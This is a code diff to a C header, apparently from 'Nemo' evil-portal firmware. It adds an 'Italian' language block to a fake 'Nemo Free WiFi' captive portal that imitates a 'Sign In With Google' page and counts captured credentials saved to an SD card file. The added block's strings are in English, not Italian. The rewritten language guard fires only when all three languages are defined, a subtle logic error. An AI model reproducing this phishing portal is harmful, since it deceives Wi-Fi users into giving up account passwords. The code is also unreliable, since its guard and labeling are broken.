@@ -6,8 +6,8 @@
 #define DEFAULT_AP_SSID_NAME "Nemo Free WiFi"
 #define SD_CREDS_PATH "/nemo-portal-creds.txt"
 
-#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR)
-#error "Please define only one language: LANGUAGE_EN_US or LANGUAGE_PT_BR"
+#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT)
+#error "Please define only one language: LANGUAGE_EN_US or LANGUAGE_PT_BR or LANGUAGE_IT_IT"
 #endif
 
 #if defined(LANGUAGE_EN_US)
@@ -28,6 +28,15 @@
 #define LOGIN_BUTTON "Avançar"
 #define LOGIN_AFTER_MESSAGE "Fazendo login..."
 #define TYPE_SSID_TEXT "Tamanho entre 2 e 32\nInvalidos: ?,$,\",[,\\,],+\n\nDigite o SSID\nEnter para Confirmar\n\n"
+#elif defined(LANGUAGE_IT_IT)
+#define LOGIN_TITLE "Sign in"
+#define LOGIN_SUBTITLE "Sign In With Google"
+#define LOGIN_EMAIL_PLACEHOLDER "Email"
+#define LOGIN_PASSWORD_PLACEHOLDER "Password"
+#define LOGIN_MESSAGE "Please log in to browse securely."
+#define LOGIN_BUTTON "Next"
+#define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
+#define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
 #endif
 
 int totalCapturedCredentials = 0;
